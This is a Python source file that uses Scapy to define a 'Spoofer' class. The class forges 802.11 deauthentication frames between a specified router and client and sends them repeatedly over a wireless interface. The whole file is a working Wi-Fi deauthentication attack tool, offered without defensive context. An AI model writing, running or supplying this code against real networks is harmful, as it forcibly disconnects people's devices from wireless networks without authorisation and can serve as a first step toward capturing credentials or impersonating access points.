from scapy.all import *
class Spoofer():
    
    def __init__(self, interface):
        self.interface = interface
        self.__running = False

    def stop(self):
        self.__running = False

    def __deauthentication_ap(self):

        pkt = RadioTap() / Dot11(addr1=self.router_mac, addr2=self.device_mac, addr3=self.device_mac) / Dot11Deauth(reason=7)

        return pkt


    def __deauthentication_cl(self):

        pkt = RadioTap() / Dot11(addr1=self.device_mac, addr2=self.router_mac, addr3=self.router_mac) / Dot11Deauth(reason=7)

        return pkt
    
    def deauthentication(self, router, device, loops):
        self.router_mac = router.get_mac() 
        self.device_mac = device.get_mac()


        for loop in range(loops):
            sendp(self.__deauthentication_ap(), iface=self.interface.get_name(), count=1, inter=.2, verbose=1)
            sendp(self.__deauthentication_cl(), iface=self.interface.get_name(), count=1, inter=.2, verbose=1)
